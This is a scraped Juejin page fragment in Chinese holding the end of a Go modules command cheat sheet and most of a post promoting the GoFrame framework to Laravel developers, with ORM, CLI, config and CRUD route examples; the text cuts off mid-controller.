0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">总结</h2>













































<table><thead><tr><th>场景</th><th>Go 命令</th></tr></thead><tbody><tr><td>新项目初始化</td><td>go mod init</td></tr><tr><td>安装依赖</td><td>go get</td></tr><tr><td>安装指定版本</td><td>go get xxx@vX</td></tr><tr><td>删除依赖</td><td>删 import + go mod tidy</td></tr><tr><td>老项目拉依赖</td><td>go mod tidy</td></tr><tr><td>只下载不编译</td><td>go mod download</td></tr><tr><td>查看依赖</td><td>go list -m all</td></tr><tr><td>清理依赖</td><td>go mod tidy</td></tr><tr><td>升级依赖</td><td>go get -u</td></tr></tbody></table>
<h2 data-id="heading-1">一、初始化项目（= npm init）</h2>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fpkg.go.dev%2F" target="_blank" title="https://pkg.go.dev/" ref="nofollow noopener noreferrer">依赖官方文档索引</a>：不是仓库，是“索引 + 文档站”，自动收录所有 <code>Go Module</code>，方便 <code>go get</code> 使用</p>
<p>总结：其实 <code>Go</code> 没有类似 <code>npm</code> 的插件仓库，是因为 <code>Go</code> 把 <code>Git</code> 当成了插件仓库。</p>
</li>
<li>
<p>✅ 新项目初始化</p>
<pre><code class="hljs language-csharp" lang="csharp">go mod <span class="hljs-keyword">init</span> myapp
</code></pre>
<p>生成：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span>.mod
</code></pre>
<blockquote>
<p>必须在 <strong>项目根目录</strong> 执行</p>
</blockquote>
</li>
<li>
<p>对照</p>





















<table><thead><tr><th>语言</th><th>命令</th></tr></thead><tbody><tr><td>npm</td><td>npm init</td></tr><tr><td>pip</td><td>pip init / poetry init</td></tr><tr><td>Go</td><td>go mod init</td></tr></tbody></table>
</li>
</ul>
<h2 data-id="heading-2">二、添加依赖（= npm install / pip install）</h2>
<ul>
<li>
<p>✅ 推荐方式（最常用）</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/gin-gonic/gin"</span>
</code></pre>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span> run main.<span class="hljs-keyword">go</span>
</code></pre>
<p>👉 Go <strong>自动下载并写入 go.mod</strong></p>
<hr/>
</li>
<li>
<p>✅ 手动添加（指定包）</p>
<pre><code class="hljs language-arduino" lang="arduino">go get github.com/gin-gonic/gin
</code></pre>
</li>
<li>
<p>✅ 指定版本</p>
<pre><code class="hljs language-kotlin" lang="kotlin">go <span class="hljs-keyword">get</span> github.com/gin-gonic/<span class="hljs-symbol">gin@</span>v1<span class="hljs-number">.10</span><span class="hljs-number">.0</span>
</code></pre>
</li>
<li>
<p>✅ 升级到最新版本</p>
<pre><code class="hljs language-kotlin" lang="kotlin">go <span class="hljs-keyword">get</span> github.com/gin-gonic/<span class="hljs-symbol">gin@</span>latest
</code></pre>
</li>
</ul>
<h2 data-id="heading-3">三、移除依赖（= npm uninstall）</h2>
<ul>
<li>
<p>⚠️ <strong>Go 没有 <code>go uninstall</code></strong></p>
</li>
<li>
<p>正确做法（两步）</p>
</li>
<li>
<p>1️⃣ 删除 import</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 删掉</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/gin-gonic/gin"</span>
</code></pre>
</li>
<li>
<p>2️⃣ 清理无用依赖</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span> mod tidy
</code></pre>
</li>
<li>
<p>👉 Go 会：</p>
<ul>
<li>删除未使用依赖</li>
<li>更新 go.mod</li>
<li>清理 go.sum</li>
</ul>
</li>
<li>
<p>对照</p>













<table><thead><tr><th>npm</th><th>Go</th></tr></thead><tbody><tr><td>npm uninstall lodash</td><td>删除 import + go mod tidy</td></tr></tbody></table>
</li>
</ul>
<hr/>
<h2 data-id="heading-4">四、同步 / 拉起老项目（= npm install）</h2>
<ul>
<li>
<p>✅ 克隆老项目后</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> xxx
<span class="hljs-built_in">cd</span> project
</code></pre>
</li>
<li>
<p>直接下载依赖</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span> mod download
</code></pre>
<p>或直接：</p>
<pre><code class="hljs language-arduino" lang="arduino">go run .
</code></pre>
<p>👉 自动按 go.mod 下载全部依赖</p>
</li>
<li>
<p>🔥 推荐指令（最稳）</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span> mod tidy
</code></pre>
<p>它会：</p>
<ul>
<li>下载缺失依赖</li>
<li>移除多余依赖</li>
<li>保证 go.mod / go.sum 干净</li>
</ul>
</li>
<li>
<p>对照</p>













<table><thead><tr><th>npm</th><th>Go</th></tr></thead><tbody><tr><td>npm install</td><td>go mod tidy</td></tr></tbody></table>
</li>
</ul>
<hr/>
<h2 data-id="heading-5">五、查看 / 管理依赖（实用）</h2>
<ul>
<li>
<p>查看当前依赖</p>
<pre><code class="hljs language-css" lang="css">go list -m <span class="hljs-attribute">all</span>
</code></pre>
</li>
<li>
<p>查看依赖树</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span> mod graph
</code></pre>
</li>
<li>
<p>为什么引入了这个包</p>
<pre><code class="hljs language-matlab" lang="matlab">go <span class="hljs-built_in">mod</span> <span class="hljs-built_in">why</span> github.com/gin-gonic/gin
</code></pre>
</li>
</ul>
<h2 data-id="heading-6">六、升级 / 降级 / 锁版本（进阶）</h2>
<ul>
<li>
<p>升级全部依赖</p>
<pre><code class="hljs language-arduino" lang="arduino">go get -u ./...
</code></pre>
</li>
<li>
<p>只升级直接依赖</p>
<pre><code class="hljs language-arduino" lang="arduino">go get -u
</code></pre>
</li>
<li>
<p>降级到指定版本</p>
<pre><code class="hljs language-kotlin" lang="kotlin">go <span class="hljs-keyword">get</span> github.com/gin-gonic/<span class="hljs-symbol">gin@</span>v1<span class="hljs-number">.9</span><span class="hljs-number">.0</span>
</code></pre>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[都2026年了，PHP还纠结转Go还是Java呢？安利一个无缝迁移的框架~]]></title>    <link>https://juejin.cn/post/7584244431869018139</link>    <guid>https://juejin.cn/post/7584244431869018139</guid>    <pubDate>2025-12-16T07:51:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584244431869018139" data-draft-id="7584244431868772379" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="都2026年了，PHP还纠结转Go还是Java呢？安利一个无缝迁移的框架~"/> <meta itemprop="keywords" content="后端,Go,Java"/> <meta itemprop="datePublished" content="2025-12-16T07:51:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="王中阳讲AI编程"/> <meta itemprop="url" content="https://juejin.cn/user/2189882892232029"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            都2026年了，PHP还纠结转Go还是Java呢？安利一个无缝迁移的框架~
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2189882892232029/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    王中阳讲AI编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:51:31.000Z" title="Tue Dec 16 2025 07:51:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;font-weight:400;line-height:2;font-size:17px;overflow-x:hidden;color:#000}.markdown-body strong{padding:1px;color:#ee3f4d}.markdown-body em{padding:0 2px;color:#f33b1f}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;margin-top:30px;margin-bottom:20px;line-height:1.5;font-weight:700}.markdown-body h1{text-align:center;padding-bottom:5px;font-size:32px;color:#ac1f18}.markdown-body h1:after{content:"";display:block;margin:4px auto 0;width:100px;height:2px;border-bottom:2px solid #f33b1f}.markdown-body h2{font-size:28px;border-bottom:1px solid #f33b1f}.markdown-body h2:before{content:"# "!important;color:#f33b1f}.markdown-body h3{font-size:24px;padding-left:9px;border-left:6px solid #f33b1f}.markdown-body h4{font-size:20px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #bbb;margin:16px 0}.markdown-body code{word-break:break-word;overflow-x:auto;background-color:#f9f1db;color:#ee2746;border-radius:2px;font-size:16px;padding:1px 2px}.markdown-body code,.markdown-body pre{font-family:-apple-system,-apple-system-body,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,PingFang SC,思源黑体 CN,思源黑体,JetBrains Mono,Fira Code,Menlo,Ubuntu Mono,Consolas,sans-serif}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{margin:12px 0!important;border-radius:3px;font-size:15px;padding:16px 12px;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f7f7f7}.markdown-body a{text-decoration:none;color:#1781b5;padding:0 2px;border-bottom:1px solid #1781b5}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #f33b1f;color:#ac1f18}.markdown-body blockquote{color:#3d3d3d;background-color:#fff9f9;padding:6px 16px;margin:16px 0;border-left:3px solid #f07c82}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:6px 0}.markdown-body ol,.markdown-body ul{padding-left:30px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:6px}.markdown-body ol li{padding-left:6px}.markdown-body ::marker{color:#f33b1f}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body .task-list-item input[type=checkbox]{position:relative}.markdown-body .task-list-item input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;background:#fff;border:1px solid #f07c82;border-radius:3px;box-sizing:border-box;z-index:1}.markdown-body .task-list-item input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-5px;left:0;right:0;bottom:0;width:0;height:0;color:#f33b1f;font-size:16px;font-weight:700;z-index:2}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border-spacing:0;border-collapse:collapse}.markdown-body table thead{background:#fff9f9;color:#000;text-align:left;font-size:15px}.markdown-body table tr:nth-child(2n){background-color:#fcfcfc}.markdown-body table tr:hover{background-color:#fff9f9}.markdown-body table td,.markdown-body table th{padding:12px 7px;line-height:24px;border:1px solid #f9f1db}.markdown-body table td{min-width:120px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><blockquote>
<p>最近贼有意思，发现了一个账号，专门发PHP转Go的帖子，哎呦喂，这不正是我3年前做的事情吗？哈哈。</p>
</blockquote>
<p>尤其看到他写的安利GoFrame教程的文章，有点刺激到我了，一看他就没我用的多，用的溜，因为我不仅在公司用GoFrame做过商业项目，还写过专栏，出过教程。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab148605d1024114ac36600b3f01207d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546L5Lit6Ziz6K6yQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476291&amp;x-signature=ylimhSaYv9JHeCGn9vBHoWoJh3I%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a5211ea8c8b43afaaee45881ce0bbb5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546L5Lit6Ziz6K6yQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476291&amp;x-signature=tcarKbW%2B1fXNTiCmlRHlPzB89qM%3D" alt="image.png" loading="lazy"/></p>
<p>作为一名<strong>深耕PHP多年</strong>的开发者，Laravel的<strong>优雅与高效</strong>早已刻入我的开发习惯。当业务需求朝着<strong>高并发、高性能</strong>方向升级，Go语言成为必然选择时，我却一度陷入"用惯了Laravel，再写Go总觉得不顺手"的困境——直到邂逅<strong>GoFrame</strong>。这个被誉为Go生态"<strong>瑞士军刀</strong>"的框架，完美复刻了Laravel的开发体验，又兼具Go语言的<strong>原生优势</strong>，让我在转型路上少走了无数弯路。今天就来拆解<strong>GoFrame为何能成为PHP开发者的Go语言入门首选</strong>，以及如何快速上手实践。</p>
<h2 data-id="heading-0">一、GoFrame：Laravel开发者的"他乡故知"</h2>
<p>GoFrame最打动PHP开发者的，是它与Laravel<strong>一脉相承的设计理念</strong>。很多用过的开发者都戏称它是"<strong>Go版Laravel</strong>"，这种亲切感源于两者在核心功能上的<strong>高度契合</strong>：</p>
<h3 data-id="heading-1">1. 如出一辙的ORM操作</h3>
<p>Laravel的<strong>Eloquent ORM</strong>是其核心亮点之一，而GoFrame的ORM设计几乎做到了"<strong>无缝衔接</strong>"。同样支持<strong>链式调用</strong>，同样<strong>简洁直观</strong>的查询语法，让习惯了Laravel的开发者无需重新适应：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// GoFrame查询示例</span>
user, err := g.Model(<span class="hljs-string">"user"</span>).Where(<span class="hljs-string">"id"</span>, <span class="hljs-number">1</span>).One()
activeUsers, err := g.Model(<span class="hljs-string">"user"</span>).Where(<span class="hljs-string">"status"</span>, <span class="hljs-number">1</span>).Order(<span class="hljs-string">"create_at desc"</span>).All()

<span class="hljs-comment">// 对比Laravel的Eloquent</span>
$user = User::where(<span class="hljs-string">'id'</span>, <span class="hljs-number">1</span>)-&gt;first();
$activeUsers = User::where(<span class="hljs-string">'status'</span>, <span class="hljs-number">1</span>)-&gt;orderBy(<span class="hljs-string">'create_at'</span>, <span class="hljs-string">'desc'</span>)-&gt;get();
</code></pre>
<p>这种<strong>语法上的相似度</strong>，让开发者能瞬间代入，极大降低了<strong>学习成本</strong>。</p>
<h3 data-id="heading-2">2. 功能对等的命令行工具</h3>
<p>Laravel的<strong>Artisan工具</strong>是提升开发效率的利器，而GoFrame的<code>gf</code>命令行工具在功能上<strong>完全不输</strong>。从<strong>项目初始化</strong>到<strong>代码生成</strong>，再到<strong>热重载运行</strong>，一套命令就能搞定所有基础操作：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># GoFrame gf工具</span>
gf init myapp          <span class="hljs-comment"># 初始化项目（对应laravel new myapp）</span>
gf gen model user      <span class="hljs-comment"># 生成数据模型（对应php artisan make:model User）</span>
gf run                 <span class="hljs-comment"># 热启动项目（无需手动重启，对应laravel serve）</span>

<span class="hljs-comment"># 额外实用功能</span>
gf gen controller user <span class="hljs-comment"># 快速生成控制器</span>
gf sql <span class="hljs-built_in">export</span>          <span class="hljs-comment"># 数据库结构导出</span>
</code></pre>
<p>熟悉的<strong>命令行体验</strong>，让开发者从Laravel切换到GoFrame时<strong>毫无违和感</strong>。</p>
<h3 data-id="heading-3">3. 经典MVC架构复用</h3>
<p>GoFrame沿用了Laravel经典的<strong>MVC（模型-视图-控制器）架构</strong>，路由、控制器、模型的<strong>代码组织方式</strong>与Laravel高度一致。这种<strong>架构上的熟悉感</strong>，让开发者能直接复用此前的<strong>项目结构设计经验</strong>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 路由定义（对应Laravel的routes/api.php）</span>
s.Group(<span class="hljs-string">"/api"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(group *ghttp.RouterGroup)</span></span> {
    group.POST(<span class="hljs-string">"/users"</span>, controller.User.Create)
    group.GET(<span class="hljs-string">"/users/:id"</span>, controller.User.Show)
})

<span class="hljs-comment">// 控制器逻辑（对应Laravel的app/Http/Controllers/UserController）</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *UserController)</span></span> Create(r *ghttp.Request) {
    <span class="hljs-comment">// 接收参数、业务处理、返回响应的流程与Laravel一致</span>
}
</code></pre>
<p>此外，GoFrame的<strong>中间件机制</strong>也与Laravel完全同源，无论是<strong>认证授权</strong>、<strong>日志记录</strong>还是<strong>限流熔断</strong>，都能按照熟悉的方式实现，无需重构<strong>开发思维</strong>。</p>
<h3 data-id="heading-4">4. 更灵活的配置管理</h3>
<p>Laravel的<code>.env</code>配置方式<strong>简洁易用</strong>，但GoFrame在此基础上提供了<strong>更灵活的方案</strong>——支持<strong>yaml、toml、json</strong>等多种格式的配置文件，还能根据<strong>环境（开发、测试、生产）</strong> 自动加载对应配置：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 开发环境配置（config.dev.yaml）</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">address:</span> <span class="hljs-string">":8080"</span>
<span class="hljs-attr">database:</span>
  <span class="hljs-attr">default:</span>
    <span class="hljs-attr">link:</span> <span class="hljs-string">"mysql:root:123456@tcp(127.0.0.1:3306)/dev_db"</span>
    <span class="hljs-attr">debug:</span> <span class="hljs-literal">true</span>

<span class="hljs-comment"># 生产环境配置（config.prod.yaml）</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">address:</span> <span class="hljs-string">":80"</span>
<span class="hljs-attr">database:</span>
  <span class="hljs-attr">default:</span>
    <span class="hljs-attr">link:</span> <span class="hljs-string">"mysql:prod_user:prod_pwd@tcp(10.0.0.1:3306)/prod_db"</span>
    <span class="hljs-attr">debug:</span> <span class="hljs-literal">false</span>
</code></pre>
<p>通过<code>gf env set</code>命令即可<strong>切换环境</strong>，比Laravel手动修改<code>.env</code>更<strong>高效安全</strong>。</p>
<h2 data-id="heading-5">二、GoFrame的独家优势：不止于"像Laravel"</h2>
<p>如果说<strong>相似性</strong>让GoFrame降低了入门门槛，那么这些<strong>独家优势</strong>才是它真正的核心竞争力：</p>
<h3 data-id="heading-6">1. Go原生的高性能</h3>
<p>作为Go语言框架，GoFrame天生继承了Go的<strong>并发优势</strong>。在同等服务器配置下，GoFrame的<strong>QPS（每秒查询率）</strong> 是传统PHP框架的<strong>5-10倍</strong>，内存占用却只有PHP的<strong>1/3</strong>。对于需要处理<strong>高并发请求</strong>的场景（如直播互动、电商秒杀），这种<strong>性能差距</strong>尤为明显。</p>
<h3 data-id="heading-7">2. 真正的模块化设计</h3>
<p>GoFrame的"<strong>全家桶</strong>"并非简单堆砌，而是由多个<strong>可独立使用的模块</strong>组成。除了Web开发必备的ORM、路由、控制器，还包含<strong>缓存、日志、验证、国际化</strong>等全套企业级组件。开发者可以<strong>按需选用</strong>，比如只使用它的ORM模块操作数据库，或用缓存模块替代Redis客户端，<strong>灵活性远超Laravel</strong>。</p>
<h3 data-id="heading-8">3. 完善的中文生态支持</h3>
<p>对于国内开发者而言，GoFrame的<strong>中文文档</strong>堪称"<strong>教科书级别</strong>"——不仅内容详尽，还包含大量针对<strong>国内场景</strong>的优化说明（如MySQL驱动适配、微信支付集成等）。此外，GitHub社区<strong>活跃度极高</strong>，大部分问题都能在<strong>24小时内</strong>找到解决方案，比依赖英文文档的Laravel生态更<strong>接地气</strong>。</p>
<h3 data-id="heading-9">4. 微服务友好型架构</h3>
<p>GoFrame的<strong>模块化设计</strong>天然适合<strong>微服务拆分</strong>。每个业务模块都可以<strong>独立部署、独立扩展</strong>，配合Go语言的<strong>跨平台编译特性</strong>，能轻松实现<strong>多环境部署</strong>。相比之下，Laravel在微服务架构中需要额外引入<strong>第三方组件</strong>，复杂度更高。</p>
<h2 data-id="heading-10">三、快速上手：30分钟搭建完整CRUD API</h2>
<p>说了这么多，不如亲手实践一番。下面以<strong>用户管理API</strong>为例，带你体验GoFrame的<strong>开发流程</strong>：</p>
<h3 data-id="heading-11">1. 环境准备与安装</h3>
<p>首先确保本地已安装<strong>Go 1.18+版本</strong>，然后执行以下命令安装<code>gf</code>工具：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装gf命令行工具</span>
go install github.com/gogf/gf/cmd/gf@latest

<span class="hljs-comment"># 验证安装成功</span>
gf -v
</code></pre>
<h3 data-id="heading-12">2. 初始化项目</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建项目</span>
gf init user-api

<span class="hljs-comment"># 进入项目目录</span>
<span class="hljs-built_in">cd</span> user-api

<span class="hljs-comment"># 启动项目（热重载模式）</span>
gf run
</code></pre>
<p>此时访问<code>http://127.0.0.1:8080</code>，就能看到GoFrame的<strong>默认欢迎页面</strong>，项目初始化完成。</p>
<h3 data-id="heading-13">3. 配置数据库</h3>
<p>编辑项目根目录的<code>config.yaml</code>文件，配置<strong>MySQL连接信息</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">database:</span>
  <span class="hljs-attr">default:</span>
    <span class="hljs-attr">link:</span> <span class="hljs-string">"mysql:root:123456@tcp(127.0.0.1:3306)/user_db"</span>
    <span class="hljs-attr">debug:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">maxIdleConn:</span> <span class="hljs-number">10</span>
    <span class="hljs-attr">maxOpenConn:</span> <span class="hljs-number">100</span>
</code></pre>
<p>确保数据库已创建（可手动创建<code>user_db</code>库），无需提前建表，后续可通过<strong>模型生成工具</strong>自动同步。</p>
<h3 data-id="heading-14">4. 生成模型与控制器</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 生成User模型（会自动创建数据表）</span>
gf gen model user -t user -f

<span class="hljs-comment"># 生成User控制器</span>
gf gen controller user
</code></pre>
<p>执行完成后，项目会自动创建<code>model/user.go</code>和<code>controller/user.go</code>文件，无需手动编写<strong>基础代码</strong>。</p>
<h3 data-id="heading-15">5. 定义路由</h3>
<p>编辑<code>router/router.go</code>文件，添加<strong>CRUD路由</strong>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> router

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"user-api/app/controller"</span>
    <span class="hljs-string">"github.com/gogf/gf/frame/g"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> {
    s := g.Server()
    <span class="hljs-comment">// 接口路由组</span>
    s.Group(<span class="hljs-string">"/api/v1"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(group *ghttp.RouterGroup)</span></span> {
        <span class="hljs-comment">// 跨域支持</span>
        group.Middleware(ghttp.MiddlewareCORS)
        <span class="hljs-comment">// 用户管理路由</span>
        group.POST(<span class="hljs-string">"/users"</span>, controller.User.Create)
        group.GET(<span class="hljs-string">"/users/:id"</span>, controller.User.Show)
        group.PUT(<span class="hljs-string">"/users/:id"</span>, controller.User.Update)
        group.DELETE(<span class="hljs-string">"/users/:id"</span>, controller.User.Delete)
        group.GET(<span class="hljs-string">"/users"</span>, controller.User.List)
    })
}
</code></pre>
<h3 data-id="heading-16">6. 完善控制器逻辑</h3>
<p>编辑<code>controller/user.go</code>，补充<strong>业务处理逻辑</strong>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> controller

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"user-api/app/model"</span>
    <span class="hljs-string">"github.com/gogf/gf/net/ghttp"</span>
    <span class="hljs-string">"github.com/gogf/gf/frame/g"</span>
)

<span class="hljs-keyword">type</span> UserController <span class="hljs-keyword">struct</span>{}

<span class="hljs-comment">// 创建用户</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *UserController)</span></span> Create(r *ghttp.Request) {
    <span class="hljs-keyword">var</span> data model.User
    <span class="hljs-keyword">if</span> err := r.Parse(&amp;data); err != <span class="hljs-literal">nil</span> {
        r.Response.WriteJsonExit(g.Map{
            <span class="hljs-string">"code"</span>: <span class="hljs-number">400</span>,
            <span class="hljs-string">"msg"</span>:  <span class="hljs-string">"参数错误："</span> + err.Error(),
        })
    }
    <span class="hljs-comment">// 插入数据库</span>
    result, err := g.Model(<span class="hljs-string">"user"</span>).Insert(&amp;data)
